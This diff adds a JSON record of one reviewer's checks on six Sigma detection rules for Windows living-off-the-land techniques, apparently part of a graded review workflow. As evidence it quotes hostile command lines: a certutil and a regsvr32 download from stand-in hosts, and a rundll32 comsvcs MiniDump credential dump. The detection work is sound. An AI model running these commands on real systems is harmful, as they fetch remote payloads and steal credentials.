@@ -1,0 +1,77 @@
+{
+ "batch": "CTL1a",
+ "reviewer": "R2",
+ "role": "primary",
+ "read_other_files": false,
+ "workflow_run": "wf_86e69ccc-de1",
+ "recorded_on": "2026-10-15",
+ "reviews": [
+  {
+   "id": "CTL1-06",
+   "verdict": "present",
+   "confidence": 88,
+   "reasoning": "YAML parses and pySigma accepts it with no errors. All 12 top-level keys are present, with a valid UUID, status experimental and date 2026/10/02. Tags match the table for T1197 (execution, persistence, stealth) and T1105 (command_and_control), and both techniques are cited. Every discriminating value (bitsadmin.exe, /transfer, /download, powershell.exe, Start-BitsTransfer) is covered by the two verbatim evidence quotes, which I confirmed occur in report_text. Only allowed fields and modifiers are used, and each OR alternative of '1 of selection*' has a long CommandLine term. By hand: all three positives match (two bitsadmin /transfer /download, one powershell Start-BitsTransfer), and none of the negatives match. Neither look-alike matches (bitsadmin /list lacks /transfer; Get-BitsTransfer is not Start-BitsTransfer). The baseline summary lists no matching command lines.",
+   "events_ok": true,
+   "incidental_issues": [
+    "Coverage is narrow: pwsh.exe is not covered, and bitsadmin /transfer without an explicit /download (the default direction) would be missed. The report itself defines the pairing, so this is not a defect.",
+    "The baseline has 25 powershell.exe events, of which only two command lines are listed, so the 0.5 percent breadth check relies on the summary."
+   ]
+  },
+  {
+   "id": "CTL1-05",
+   "verdict": "present",
+   "confidence": 90,
+   "reasoning": "YAML and pySigma parse cleanly, metadata is complete, and the tags (attack.command_and_control, attack.t1105) match the table for T1105. The values '\\certutil.exe', '-urlcache' and '-split' occur in the verbatim evidence quote 'certutil.exe -urlcache -split -f http://203.0.113.45/...' (confirmed in report_text). The windash|contains|all chain is allowed and is the standard Sigma ordering. By hand, the dash-form positive, the slash-form positive (/urlcache /split) and the reordered positive (-split -urlcache) all match. Negatives do not match. Look-alike 'certutil.exe -hashfile ...' lacks the switches, and 'certutil.exe -urlcache * delete' lacks -split, so neither matches. The baseline has no certutil.",
+   "events_ok": true,
+   "incidental_issues": [
+    "The slash spelling appears in report_text but not in the quoted evidence. G4 strips separators, so the values are still covered.",
+    "Look-alike 2 contains a literal '*' in the command line, which is harmless."
+   ]
+  },
+  {
+   "id": "CTL1-04",
+   "verdict": "present",
+   "confidence": 85,
+   "reasoning": "YAML and pySigma parse cleanly and metadata is complete. T1218.005 gets attack.stealth and attack.t1218.005, as in the table. Every value is covered by the three evidence quotes confirmed in report_text: mshta.exe, http, vbscript:, javascript:, hrportal.exe and hrportal.hta. The condition 'selection_img and selection_cli and not filter_hr' uses only allowed constructs, and ParentImage is an allowed process_creation field. By hand: the three positives (http URL, vbscript:, javascript: with embedded http) match and are not filtered because their parents are WINWORD, cmd and explorer. The negatives have no mshta. Look-alike 1 (hrportal.exe parent, hrportal.hta plus an http arg) matches the selection but is removed by filter_hr. Look-alike 2 (help.hta) has no http, vbscript: or javascript: term, so it does not match. The baseline has no mshta.",
+   "events_ok": true,
+   "incidental_issues": [
+    "Look-alike 1 adds an http argument to the HR launcher, slightly beyond the report's claim that it always uses only the local file. It does exercise the exclusion, so it is a good test.",
+    "The 'http' term is exactly four characters, right at the G11 minimum, and matches any substring 'http' in an mshta command line. The filter would also suppress a malicious mshta whose parent is hrportal.exe and whose command line contains hrportal.hta. Both are acceptable and report-supported."
+   ]
+  },
+  {
+   "id": "CTL1-03",
+   "verdict": "present",
+   "confidence": 90,
+   "reasoning": "YAML and pySigma parse cleanly and all metadata is present. T1218.010 gets attack.stealth and attack.t1218.010, as in the table. The values regsvr32.exe, scrobj.dll and /i:http occur in the verbatim quote 'regsvr32.exe /s /n /u /i:http://files.cranemail.test/update.sct scrobj.dll', which I confirmed in report_text. 'all of selection*' is allowed and all three selections start with 'selection'. By hand: all three positives match (http, https via the /i:http prefix, and an IP URL). The negatives (msiexec, cmd, OUTLOOK) do not. Look-alike 1 (regsvr32 /s of viewer.dll) and look-alike 2 (regsvr32 /s /u shell.dll) lack scrobj.dll and /i:http, so they do not match. The baseline has no regsvr32.",
+   "events_ok": true,
+   "incidental_issues": [
+    "Positive 2 uses an https URL, whereas the report says an http URL in every observed case. The rule still covers it through the prefix.",
+    "The dash form '-i:http' and a quoted /i:\"http\" form are not covered, which is acceptable given the report.",
+    "Look-alike 2 has an unquoted path with spaces, which is cosmetic."
+   ]
+  },
+  {
+   "id": "CTL1-02",
+   "verdict": "present",
+   "confidence": 88,
+   "reasoning": "YAML and pySigma parse cleanly, metadata is complete, and the id is a valid UUID. Tags carry both techniques correctly: attack.credential_access and attack.t1003.001 for T1003.001, and attack.stealth and attack.t1218.011 for T1218.011. Both techniques are cited. Every value (rundll32.exe, comsvcs.dll, MiniDump, #24) is covered: the first three by the verbatim quote 'The actor ran rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 ...' and '#24' by the second quote, both confirmed in report_text. By hand: the by-name positive, the ordinal '#24' positive and the lower-case SysWOW64 'minidump' positive all match case-insensitively. The negatives do not match. The look-alikes (rundll32 shell32 Control_RunDLL, and tasklist filtering lsass.exe) lack comsvcs.dll, so they do not match. The baseline has no rundll32.",
+   "events_ok": true,
+   "incidental_issues": [
+    "'#24' is only three characters, but it is ANDed with comsvcs.dll under a rundll32 image, so G11 is satisfied by the 'comsvcs.dll' term.",
+    "The third positive is a plausible but synthetic WmiPrvSE/SYSTEM execution context."
+   ]
+  },
+  {
+   "id": "CTL1-01",
+   "verdict": "present",
+   "confidence": 90,
+   "reasoning": "YAML and pySigma parse cleanly and all required keys are present with a valid UUID and date. T1218.011 gets attack.stealth and attack.t1218.011, matching the table. The values rundll32.exe, javascript: and RunHTMLApplication are covered by the two verbatim evidence quotes, which I confirmed in report_text. Fields and modifiers (Image|endswith, CommandLine|contains|all) are within the subset. By hand: all three positives match, including the lower-case 'runhtmlapplication' variant on SysWOW64, under case-insensitive matching. The negatives (cmd ipconfig, chrome, schtasks) do not match. The look-alikes (rundll32 shell32 Control_RunDLL desk.cpl, and printui.dll) lack javascript: and RunHTMLApplication, so they do not match. The baseline has no rundll32 activity of this kind.",
+   "events_ok": true,
+   "incidental_issues": [
+    "References is the placeholder 'urn:atidep:case', which the contract allows.",
+    "Report text says the parent is Word or Explorer, but the rule does not depend on the parent, which is fine."
+   ]
+  }
+ ]
+}
